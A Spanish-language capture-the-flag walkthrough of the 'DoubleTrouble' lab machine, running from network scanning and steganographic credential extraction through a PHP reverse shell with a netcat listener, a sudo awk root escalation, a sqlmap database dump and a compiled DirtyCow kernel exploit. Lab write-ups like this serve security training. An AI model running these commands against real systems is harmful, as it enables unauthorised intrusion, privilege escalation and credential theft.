**1.- Escaneo de la red local:**
Para escanear la red local para identifica la IP de la máquina, para ello usaremos el siguiente comando:

arp-scan --localnet
<img src="Pasted image 20240225174411.png">

**2.- Realizamos un escaneo de puertos**
Para realizar el escaneo de puertos hay que hacer un nmap.

nmap -sS -sV (ip de la máquina)
![[Pasted image 20240225174515.png]]

Hemos podido localizar que tiene el puerto 80 abierto, podemos decir que tiene una web corriendo.
Para cojer un poco más de información sobre la web relizaremos el siguiente comando.
![[Pasted image 20240225174632.png]]

una vez tenemos información sobre ella, entraremos a la web desde el navegador.
![[Pasted image 20240225174712.png]]

**3.- Mirar archivos o directorios ocultos**

Miramos si hay archivos ocultos gracias a la herramienta gobuster. Para ello introducimos el siguiente comando.

gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://192.168.1.76
![[Pasted image 20240225175144.png]]

vemos una carpeta un tanto sospechosa, esta se llama /secret. Para abrirla la pondemos en el navegador al lado de la ip

(ip)/secret
![[Pasted image 20240225175309.png]]

vemos que hay una imagen, la descargamos para analizarla. Para ello usaremos la siguiente herramienta stegseek.

stegseek doubletrouble.jpg -wl /usr/share/wordlists/rockyou.txt -xf img
![[Pasted image 20240225175639.png]]

podemos ver que se nos ha descargado una imagen. Miramos el contenido de la imagen. Para ello usaremos el cat.

cat img
![[Pasted image 20240225175806.png]]

Esto nos da las credenciales del login de la web. Entonces iniciaremos sesión.
![[Pasted image 20240226225242.png]]


y entramos a la configuracion del usuario
![[Pasted image 20240226225312.png]]

aqui subiremos un archivo php para ejecutar una reverse shell

al subirlo nos saldrá esto, entonces tendremos que ir a la carpeta /uploads/users
![[Pasted image 20240226225539.png]]
![[Pasted image 20240226225600.png]]

a partir de esto nos pondremos escuchando con netcat en el puerto 4444

nc -lnvp 4444
![[Pasted image 20240226225700.png]]

ahora le daremos click al archivo que acabamos de subir y obtendremos conexion
![[Pasted image 20240226225839.png]]
ya tenemos control, para ver la ruta haremos "script /dev/null -c bash"
![[Pasted image 20240226225948.png]]

ejecutamos el comando sudo -l para ver si tenemos algun permiso de administrador, y nos damos cuenta de que nos muestra el siguiente mensaje
![[Pasted image 20240226230104.png]]
Para escalar privilegios tendremos que escribir el siguiente comando
sudo awk 'BEGIN {system("/bin/bash")}'
![[Pasted image 20240226230216.png]]
con esto ya tenemos permiso de administrador, nos situamos en la carpeta root y vemos que tenemos otra ova, entonces la descargamos en nuestro ordenador local con el comando python -m http.server 80

y la ejecutamos
vemos que tenemos un login de administrador
![[Pasted image 20240226230456.png]]

para sacar las passwords de administrador ejecutaremos el siguiente comando
sqlmap -u http://10.0.0.28/index.php --forms --current-db -D doubletrouble -T users --dump
![[Pasted image 20240226231147.png]]

ahora entraremos via ssh en lel usuario clapton
![[Pasted image 20240226231309.png]]

ahora cojeremos un exploit para poder escalar privilegios: [https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)

los descargaremos desde local con el comando wget https://github.com/FireFart/dirtycow/blob/master/dirty.c
![[Pasted image 20240226231534.png]]

lo subiremos a un servidor python y lo descargaremos en el ssh
![[Pasted image 20240226231605.png]]

![[Pasted image 20240226231736.png]]

ya de paso vemos que tenemos un txt y lo abrimos y vemos que es la primera flag
![[Pasted image 20240226231812.png]]

una vez tenemos el exploit lo compilamos con el siguiente comando
gcc -pthread dirty.c -o dirty -lcrypt
![[Pasted image 20240226232420.png]]

una vez compilado lo ejecutamos
![[Pasted image 20240226232504.png]]
elegimos nueva contraseña y nos da un usuario llamado firefart que entraremos via ssh y escribiremos la nueva contraseña
![[Pasted image 20240226232623.png]]
 y miramos que contiene y ejecutamos la flag
 ![[Pasted image 20240226232701.png]]
